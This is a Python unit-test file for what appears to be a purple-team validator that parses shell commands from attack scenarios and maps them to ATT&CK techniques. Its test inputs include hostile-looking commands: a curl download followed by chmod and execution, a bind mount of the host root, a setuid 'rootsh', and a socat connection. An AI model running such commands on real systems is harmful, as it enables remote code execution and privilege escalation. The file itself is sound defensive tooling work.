import unittest

from purplebpf.offensive.validator.levels.level2.parser import (
    CommandParseError,
    extract_command_invocations,
    parse_command,
)
from purplebpf.offensive.validator.levels.level2.usage_stats import collect_command_usage
from purplebpf.offensive.validator.levels.level2.validator import validate_scenario, validate_shell
from purplebpf.offensive.validator.levels.level3.mapper import map_actions
from purplebpf.offensive.validator.levels.level3.validator import validate_scenario as validate_level3


class GenericExtractionTests(unittest.TestCase):
    def test_full_support_command_keeps_detailed_analysis(self):
        result = validate_shell("mount --bind / /host")["commands"][0]

        self.assertEqual(result["support_tier"], "full")
        self.assertTrue(result["cli_validation"]["valid"])
        self.assertTrue(result["elements"])
        self.assertTrue(result["resources"]["produces"])
        self.assertTrue(result["facts"])

    def test_metadata_support_tier(self):
        result = validate_shell("touch /tmp/a")["commands"][0]

        self.assertEqual(result["support_tier"], "metadata")
        self.assertTrue(result["cli_validation"]["valid"])

    def test_generic_command_preserves_executable_and_argv_only(self):
        result = validate_shell("socat TCP:example.com:80 -")["commands"][0]

        self.assertEqual(result["executable"]["normalized"], "socat")
        self.assertEqual(result["argv"], ["TCP:example.com:80", "-"])
        self.assertEqual(result["support_tier"], "generic")
        self.assertEqual(result["elements"], [])
        self.assertEqual(result["resources"], {"requires": [], "produces": []})
        self.assertEqual(result["facts"], [])
        self.assertIsNone(result["cli_validation"]["valid"])
        self.assertEqual(result["cli_validation"]["code"], "UNSUPPORTED_COMMAND")

    def test_unknown_command_is_generic_not_parser_error(self):
        shell = validate_shell("some-unknown-tool --foo /tmp/a")
        result = shell["commands"][0]

        self.assertEqual(result["executable"]["normalized"], "some-unknown-tool")
        self.assertEqual(result["argv"], ["--foo", "/tmp/a"])
        self.assertEqual(result["analysis"]["cli"], "unknown")
        scenario = validate_scenario(
            {"steps": [{"order": 1, "command": "some-unknown-tool --foo /tmp/a"}]}
        )
        self.assertEqual(scenario["status"], "REVIEW")
        self.assertEqual(scenario["errors"][0]["code"], "UNSUPPORTED_COMMAND")

    def test_multiple_commands_and_operators(self):
        source = "curl -o /tmp/a https://example.com/a && chmod +x /tmp/a && /tmp/a"
        result = extract_command_invocations(source)

        self.assertEqual(
            [item["executable"]["raw"] for item in result["commands"]],
            ["curl", "chmod", "/tmp/a"],
        )
        self.assertEqual(
            [item["operator"] for item in result["operators"]], ["&&", "&&"]
        )

    def test_or_semicolon_and_pipeline_are_preserved(self):
        listed = extract_command_invocations("a || b; c")
        piped = extract_command_invocations("cat /tmp/a | grep token")

        self.assertEqual(
            [item["operator"] for item in listed["operators"]], ["||", ";"]
        )
        self.assertEqual(
            [item["executable"]["normalized"] for item in piped["commands"]],
            ["cat", "grep"],
        )
        self.assertEqual(piped["operators"][0]["operator"], "|")

    def test_original_single_command_parser_contract_is_preserved(self):
        with self.assertRaises(CommandParseError):
            parse_command("a && b")

    def test_bash_and_sh_c_are_nested_but_python_is_not(self):
        bash = extract_command_invocations(
            "bash -c 'curl https://example.com/a -o /tmp/a && chmod +x /tmp/a'"
        )
        shell = extract_command_invocations("/bin/sh -c 'mount --bind / /host'")
        python = extract_command_invocations("python3 -c 'print(\"hello\")'")

        self.assertEqual(
            [
                item["executable"]["normalized"]
                for item in bash["commands"][0]["nested_commands"]
            ],
            ["curl", "chmod"],
        )
        self.assertEqual(
            shell["commands"][0]["nested_commands"][0]["executable"]["normalized"],
            "mount",
        )
        self.assertNotIn("nested_commands", python["commands"][0])

    def test_nested_depth_is_bounded(self):
        result = extract_command_invocations("bash -c 'echo x'", max_depth=0)

        self.assertTrue(result["commands"][0]["nested_truncated"])
        self.assertNotIn("nested_commands", result["commands"][0])

    def test_invalid_shell_syntax_remains_parser_error(self):
        with self.assertRaises(CommandParseError):
            extract_command_invocations("if true; then echo x")

    def test_generic_executable_can_still_map_without_tier_branch(self):
        invocation = validate_shell("/tmp/payload")["commands"][0]
        mapped = map_actions(invocation)

        self.assertEqual(invocation["support_tier"], "generic")
        self.assertEqual(mapped["actions"][0]["action"], "EXECUTE_FILE")

    def test_level3_walks_multiple_invocations_without_tier_gate(self):
        scenario = {
            "technique_id": "T1548.001",
            "steps": [
                {
                    "order": 1,
                    "command": "some-unknown-tool && chmod u+s /tmp/rootsh",
                }
            ],
        }
        result = validate_level3(scenario)

        self.assertEqual(result["status"], "PASS")
        self.assertTrue(result["technique_validation"]["matched"])


class CommandUsageTests(unittest.TestCase):
    def test_collects_scenarios_steps_techniques_tiers_and_nested_commands(self):
        scenarios = [
            {
                "technique_id": "T1105",
                "steps": [
                    {
                        "order": 1,
                        "command": "bash -c 'curl https://example.com/a && wget x'",
                    },
                    {"order": 2, "command": "/tmp/payload"},
                ],
            },
            {
                "technique_id": "T1105",
                "steps": [{"order": 1, "command": "/bin/bash -c 'wget y'"}],
            },
        ]
        result = {item["command"]: item for item in collect_command_usage(scenarios)}

        self.assertEqual(result["bash"]["scenario_count"], 2)
        self.assertEqual(result["bash"]["step_count"], 2)
        self.assertEqual(result["wget"]["invocation_count"], 2)
        self.assertEqual(result["wget"]["support_tier"], "metadata")
        self.assertEqual(result["curl"]["support_tier"], "full")
        self.assertEqual(result["/tmp/payload"]["command"], "/tmp/payload")
        self.assertEqual(result["wget"]["techniques"], ["T1105"])


if __name__ == "__main__":
    unittest.main()
